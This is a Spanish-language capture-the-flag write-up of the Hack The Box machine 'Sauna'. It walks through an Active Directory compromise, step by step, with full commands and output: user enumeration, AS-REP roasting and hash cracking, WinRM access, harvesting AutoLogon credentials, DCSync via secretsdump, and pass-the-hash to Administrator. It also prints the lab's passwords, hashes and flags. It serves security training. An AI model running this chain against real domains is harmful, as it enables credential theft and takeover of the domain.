# Hack The Box - Machines

 
 ![alt text](image.jpg)

HackTheBox | Sauna (ACTIVE DIRECTORY)

Contenido
Escenario	2
Fase de reconocimiendo	2
Escaneo de puertos y servicios	2
Escaneo de recursos compartidos	3
Análisis sitio web	5
Validar usuarios potenciales. Kerbrute	7
AS-REP Roasting Attack	7
Crackear hash	7
Validar acceso remoto. SMB y WinRM	8
SMB	8
WINRM	8
Conectar al sistema.	8
Evil-WinRM	8
Enumerar usuarios del dominio. RpcClient	9
Enumerar servicios del dominio. Ldapdomaindump	9
Escalada de privilegios	10
BloodHound y Neo4j	10
Enumerar la máquina objetivo. WinPEAS	10
Evaluación de seguridad de AD para usuario svc_loanmgr. Crackmapexec	11
Conexion Evil-WinRM para usuario svc_loanmgr	12
Neo4j y BloodHound	13
Privilegios DCSync	14
Secretsdump	15
Conexión remota con Administrator	16

 

Escenario
Sauna es una máquina que maneja los conceptos de Windows Active Directory empaquetados. Comenzaremos realizando un fase de reconocimiento para ver los puertos y servicios del objetivo. Se hará necesario examinar la página web que ofrece el objetivo y profundizaremos en los usuarios de la empresa, los cuales son menester para crear un diccionario de posibles usuarios válidos del sistema. Más adelante, usando una fuerza bruta de Kerberoast en los nombres de usuario para identificar a un puñado de usuarios, y luego encontraremos que uno de ellos tiene la bandera configurada para permitir la toma de su hash sin autenticación en el dominio. Haremos AS-REP Roast para obtener el hash, romperlo y obtener una shell. Encontraremos las credenciales de los próximos usuarios en la clave de registro de AutoLogon. BloodHound mostrará que el usuario tiene privilegios que le permiten realizar un ataque DC Sync, que proporciona todos los hashes de dominio, incluidos los administradores, que usaremos para obtener una shell.
Fase de reconocimiendo

Escaneo de puertos y servicios
ping -c 1 10.10.10.175
PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data.
64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=46.6 ms

Con la herramienta nmap, hacemos un reconocimiento de todos los puertos abiertos. Usamos el parametron -Pn para que no aplique host discovery. Descubrimiento de hosts por el protocolo ARP.
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.175 -oG /home/juan/HTB/sauna/nmap/allPorts
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49696/tcp open  unknown

De nuevo usamos la herramienta nmap para lazar scritps básicos de reconocimiento tratando de averguar la versión y servicio que corren sobre esos puertos:
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49675,49676,49678,49698,49718 10.10.10.175 -oN /home/kali/sauna/nmap/targeted


crackmapexec smb 10.10.10.175
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)

cat /etc/hosts
10.10.10.175    EGOTISTICAL-BANK.LOCAL

Escaneo de recursos compartidos
Vamos a hacer un escaneo smb sin proporcionar usuarios, haciendo susouo de null session, para ver los recursos compartidos con las herramientas smblcient y smbmap:

smbclient -L 10.10.10.175 -N
Anonymous login successful
        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

smbmap -H 10.10.10.175
[+] IP: 10.10.10.175:445        Name: EGOTISTICAL-BANK.LOCAL

 Los comandos anteriores no nos han reportado nada.

Tiene abierto el puerto 3268 con el servicio LDAP. Vamos a realizar un escaneo con la herramienta ldapsearch filtrando por los namingcontexts:
ldapsearch -x -h 10.10.10.175 -s base namingcontexts
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

A través de los namingcontexts podemos incorporar con el parámetro -b para ver información adicional que puede ser relevante:
ldapsearch -x -h 10.10.10.175 -s base -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'

Encontramos esta línea aparentemente en base64 y la podemos hacer el proceso inverso:
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==
echo "AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==" | base64 -d; echo
(@����%�D����\D��

No revela nada, pero en el caso de que existiese algún parámetro relacionado con contraseñas podría ser relevante.

Analizamos el puerto 135 con el servicio RPC con la herramienta RpcClient haciendo uso de un null session y si conecta, intentamos listar los usuarios del dominio con enumdomusers:
rpcclient -U "" 10.10.10.175 -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED

Nos reporta un acceso denegado por no tener credenciales.

Tenemos abierto el puerto 88 con el servicio Kerberos. En este punto podríamos usar la herramienta Kerbrute para reconocer usuarios válidos del dominio a través de un archivo con usuarios potenciales pero aún no tenemos ningún posible usuario.

Análisis sitio web
Por otra parte tenemos el puerto 80 abierto, con lo que accederemos desde nuestro navegador y veremos que nos ofrece:
 

Podemos analizar el website con la extensión Wappanalyzer, la cual nos reporta información del sitio web donde estamos accediendo:
 

Seguimos analizando. Ahora usaremos la herramienta Whatweb. Actúa como la herramienta anterior pero desde consola:
whatweb http://10.10.10.175
http://10.10.10.175 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@email.com,info@example.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.175], Microsoft-IIS[10.0], Script, Title[Egotistical Bank :: Home]


Ahora, analizamos el website en busca de usuarios y, ‘por suerte’, en la sección de Team encontramos personas que parecen ser trabajadores de la organización que estamos analizando:
 

Gracias a la información que nos reporta sobre posibles trabajadores, podemos crear un diccionario deusuarios:
cat /home/juan/HTB/sauna/content/usuarios.txt
FergusSmith
HugoBear
StevenKerb
ShaunCoins
BowieTaylor
SophieDriver

Fergus.Smith
Hugo.Bear
Steven.Kerb
Shaun.Coins
Bowie.Taylor
Sophie.Driver

FSmith
HBear
SKerb
SCoins
BTaylor
SDriver

FergusS
HugoB
StevenK
ShaunC
BowieT
SophieD


Validar usuarios potenciales. Kerbrute
Con este archivo que contiene posibles usuarios de la organización vamos a usar la herramienta Kerbrute con la que comprobaremos si son válidos:
./kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /home/juan/HTB/sauna/content/usuarios.txt
2021/12/12 13:45:51 >  Using KDC(s):
2021/12/12 13:45:51 >   10.10.10.175:88
2021/12/12 13:45:52 >  [+] VALID USERNAME:       FSmith@c
2021/12/12 13:45:52 >  Done! Tested 24 usernames (1 valid) in 0.229 seconds

El resultado son 24 nombres de usuarios testeados de los cuales uno de ellos, FSmith, es válido.

AS-REP Roasting Attack
Con esto tenemos una vía potencial para realizar un ataque AS-REP Roasting attack, para solicitar un TGT (Tikect Granting Tikect) en Kerberos. Para ello usamos la herramienta GetNPUsers. Si detecta un usuario que no requiere autenticación previa de Kerberos, se debe visualizar un hash que podríamos crackear.
Viendo la ayuda podemos determinar los parámetros a pasar al comando:
Request TGTs for users in a file
        GetNPUsers.py contoso.com/ -no-pass -usersfile users.txt 

A continuación, lanzamos el comando:
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile /home/juan/HTB/sauna/content/usuarios.txt
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:1d60153aaf8421d9264be4c068c817c4$d4e87f86babdfdbbe9d7af50556a324df437ed36519ff727ef8aab498ab2c9570159e48bd4fecbb95cd1b67dd8c588aee29bf4e7e6b37f2be2cf0c37520baae00b53f8ba5935da06015a28a1c88885e3ef8a8a187922db33497f20240db59fab873d453b8d95452f4cc8ed5db813df17d5ddb200729e8d44c840cc121f0ba65548dc14d7df3639a11a0ef245f643ca98c9159e9cc5e3b8ee9057b50b317607ad5a04a388e627298dd4730b7e447b3f8be0202f0dd8bd1aa6c72f5f63b71083c11f7a8ea39b6ed92473b88309165742c695c20432ab45f8b6670914d60eff207f6f924dfda7a61d140a356b81979b89bfe3d0b2e00989d5d853783ce6b703c5eb

Crackear hash
Nos ha reportado un usuario con su hash, el cual guardaremos en un archivo de nombre hash y que trataremos de romper con la herramienta john the ripper:
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Thestrokes23     ($krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL)

Ahora, guardaremos en un archivo credentias.txt las credenciales válidas del usuario:
cat credentials.txt
fsmith:Thestrokes23

Validar acceso remoto. SMB y WinRM
Ahora, vamos a validar por smb (445) y winrm (5985) si es cierto que las credenciales son válidas:
SMB
smb 10.10.10.175 -u'fsmith' -p 'Thestrokes23'
SMB  10.10.10.175 445 SAUNA   [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB   10.10.10.175  445  SAUNA     [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23

WINRM
crackmapexec winrm 10.10.10.175 -u'fsmith' -p 'Thestrokes23'
WINRM   10.10.10.175    5985   SAUNA   [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
WINRM    10.10.10.175    5985   SAUNA      [*] http://10.10.10.175:5985/wsman
WINRM  10.10.10.175 5985  SAUNA    [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)

Con smb vemos que las credenciales son correctas y son reportadas pero no tenemos acceso. Sin embargo, a través de WinRM tenemos acceso y nos marca el (Pwn3d!).

Conectar al sistema.
Evil-WinRM
En este momento, vamos a intentar conectarnos con la herramienta evil-winrm indicando la IP, usuario y contraseña:
evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
*Evil-WinRM* PS C:\Users\FSmith\Documents>

Hemos conectado de forma remota por RPC. Ahora podemos ingresar al escritorio y ver la flag:
C:\Users\FSmith\Desktop> type user.txt
1c29408df6bc8cbb7ad0c579c22a786e

Enumerar usuarios del dominio. RpcClient
Por otra parte, podemos conectarnos con rpcclient para enumerar, ahora sí, los usuarios del dominio:
rpcclient -U "fsmith%Thestrokes23" 10.10.10.175 -c "enumdomusers"
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[HSmith] rid:[0x44f]
user:[FSmith] rid:[0x451]
user:[svc_loanmgr] rid:[0x454]

Enumerar servicios del dominio. Ldapdomaindump
Sabiendo que LDAP está abierto, podemos aprovechar para, con ldapdomaindump, enumerar servicios de la máquina. Nos movemos al directorio /var/www/html y lanzamos el comando:
ldapdomaindump  -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' 10.10.10.175

Ahora podemos iniciar apache e ingresar desde el navegador al localhost o a la ruta /var/www/html y movernos a domain_users_by_group.html:
 

Vemos que podemos autenticarnos de forma remota con los usuarios  svc_loanmgr y FSmith, ya que se encuentran dentro del grupo Remote Management User.

Desde la conexión creada anteriormente con winrm, podemos ver que privilegios tiene el usuario desde el que nos hemos conectado:
whoami /priv                                                                                                                                                                                                   
PRIVILEGES INFORMATION                                                                                                                                                                             
----------------------                                                                                                                                                                                                                                                                                                                                                                           
Privilege Name                Description                    State                                                                                                                                 
============================= ============================== =======                                                                                                                               
SeMachineAccountPrivilege     Add workstations to domain     Enabled                                                                                                                               
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                                                                                               
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


whoami /all
User Name              SID                                                                                                                                                                         
====================== ==============================================                                                                                                                              
egotisticalbank\fsmith S-1-5-21-2966785786-3096785034-1186376766-1105

Escalada de privilegios

BloodHound y Neo4j
Primero, descargamos dos herramientas: neo4j y bloodhound ‘apt install neo4j bloodhound -y’ Ahora, usamos el comando ‘neo4j console’ para arrancar una pequeña base de datos que se encuentra disponible por el puerto 7474. Desde el navegador, ingresamos por ‘localhost:7474’. El usuario es ne4j y pass neo4j. Está pass habrá que cambiarla.

Además, podemos instalar la herramienta bloodhound-python. Esta herramienta se ejecuta a través de comandos desde la consola.
pip install bloodhound

Enumerar la máquina objetivo. WinPEAS
WinPEAS se trata de una herramienta de escalada de privilegios para Windows, MacOS y Linux. Trata de buscar rutas de escalada de privilegios locales que podrian ser explotadas, reconociendo configuraciones incorrectas en el sistema atacado.

Vamos a enumerar la máquina con la herramienta WinPeas y lo descargamos desde el repositorio de GitHub en nuestra máquina:
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe/binaries/x64/Release
 Ahora, en la máquina a comprometer, subimos el archivo:
*Evil-WinRM* PS C:\> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> upload /home/juan/Descargas/winPEASx64.exe
Info: Uploading /home/juan/Descargas/winPEASx64.exe to C:\Windows\Temp\winPEASx64.exe                                                   
Data: 2570240 bytes of 2570240 bytes copied
Info: Upload successful!

A continuación, ejecutamos el programa winPEASx64.exe
*Evil-WinRM* PS C:\Windows\Temp> .\winPEASx64.exe
=======================================================================
Computer Name           :   SAUNA
   User Name               :   svc_loanmgr
   User Id                 :   1108
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/24/2020 3:48:31 PM

   =======================================================================
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

Hemos encontrado un usuario, svc_loanmanager, con su respectiva contraseña. Lo buscamos en el registro y encontramos que su nombre es svc_loanmgr. Como vemos, forma parte del grupo Remote Management Users. Intentamos a validar con crackmapexec por smb y, a continuación, por winrm:
 

Evaluación de seguridad de AD para usuario svc_loanmgr. Crackmapexec
crackmapexec smb 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!

crackmapexec winrm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
WINRM       10.10.10.175    5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
WINRM       10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)

Este paso que hemos hecho para averiguar el usuario a través del reconocimiento con la herramienta Winpeas, podemos hacerlo a través de un comando:
*Evil-WinRM* PS C:\Users\FSmith\Documents> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
DefaultPassword    REG_SZ    Moneymakestheworldgoround!

Conexion Evil-WinRM para usuario svc_loanmgr
Podemos conectarnos por Winrm:
evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotisticalbank\svc_loanmgr

Podemos ver si el usuario está dentro de algún grupo interesante:
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami /priv
Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users

Dado que tenemos las credenciales de este nuevo usuario, vamos a volver a utilizar la herramienta bloodhound sobre este usuario. Esto nos dumpea archivos en .json los cuales se pueden incorporar en el framework de bloodhound:

``bloodhound-python -c all -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175``
```
root@kali:/home/juan/HTB/sauna/content# ls
20211212215923_computers.json	20211212215923_groups.json  20211212220025_computers.json	20211212220025_groups.json  
20211212215923_domains.json   	20211212215923_users.json   20211212220025_domains.json 	 20211212220025_users.json   
```

Neo4j y BloodHound
Una vez lo hemos instalado, arrancamos neo4j para arrancar la base de datos a la que se conectará posteriormente bloodhound. Neo4j monta un puerto local y se ha de configurar un usuario (neo4j) y contraseña (Kali):
neo4j console

Desde otra terminal, arrancamos bloodhound en segundo plano:
bloodhound &> /dev/null &
Si queremos independizar el proceso de bloohound para cerrar la terminal sin que se cierre la herramienta bloohound, podemos lanzar el comando disown.
Ingresamos en BloodHound con las credenciales de usuario (neo4j) y contraseña (Kali):
 

Ingresamos en Neo4j desde el navegador con las credenciales de usuario (neo4j) y contraseña (Kali).
 

Ahora, debemos subir los archivos .json creados anteriormente a bloodhound haciendo clic sobre el botón Upload data que se encuentra en el panel derecho:
 
Una vez ha finalizado la subida de todos los archivos, hacemos clic en Clear Finished.

Ahora podemos ver de forma gráfica la estructura del dominio de nuestro objetivo. Además, en el panel izquierdo tenemos multitud de posibles consultas con las que podremos determinar qué ataques podemos realizar.
 

Privilegios DCSync
Podemos comprobar si existe algún usuario que tenga privilegios que posibiliten administrar DCSync (Finf Principals with DCSync Rights).
 

Si observamos el mapa anterior, podemos ver que el usuario SVC_LOANMGR  tiene privilegios GetChanges y GetChangesAll sobre EGOTISTICAL-BANK.LOCAL.

Sobre la traza curvilínea de SVC_LOANMGR a EGOTISTICAL-BANK.LOCAL, la cual marca el privilegio GetChangesAll y haciendo clic derecho > Help nos indica cómo podríamos ganar el acceso a DCSync.

Secretsdump
No obstante, existe otra vía potencial de ganar los privilegios de DCSync de manera local y más cómoda. Se trata de Secretsdump, a la cual le pasamos como parámetros el Dominio/Usuario:Pass@IP. Esto realiza el DCSync mediante el método DRSUAPI y, en consecuencia, conseguimos ver todos los hashes del directorio activo:
secretsdump.py 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::                                                                                                             
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                     
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::                                                                                                                    
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::                                                                                            
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::                                                                                            
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::                                                                                       
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7a2ffb8ed5cb53d53fbcc114925a77fe:::                                                                                                                   
[*] Kerberos keys grabbed                                                                                                                                                                          
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657                                                                                             
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e                                                                                                                             
Administrator:des-cbc-md5:fb8f321c64cea87f                                                                                                                                                         
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24                                                                                                    
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:36f317fcf453cc399894d7b4414936544edc543bb227f464f26c1c4a32f64c27
SAUNA$:aes128-cts-hmac-sha1-96:804e24be071daffa987f7c27f824e5e4
SAUNA$:des-cbc-md5:c2ea92e619458c34

Conexión remota con Administrator
Ahora estamos en posesión de ejecutar la herramienta evil-winrm para conectarnos como administrador proporcionando su hash como contraseña:
evil-winrm -i 10.10.10.175 -u 'Administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
    Directory: C:\Users\Administrator\Desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       12/12/2021   6:58 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
e484924512dd149d2d5d368dde0d328f
*Evil-WinRM* PS C:\Users\Administrator\Desktop>

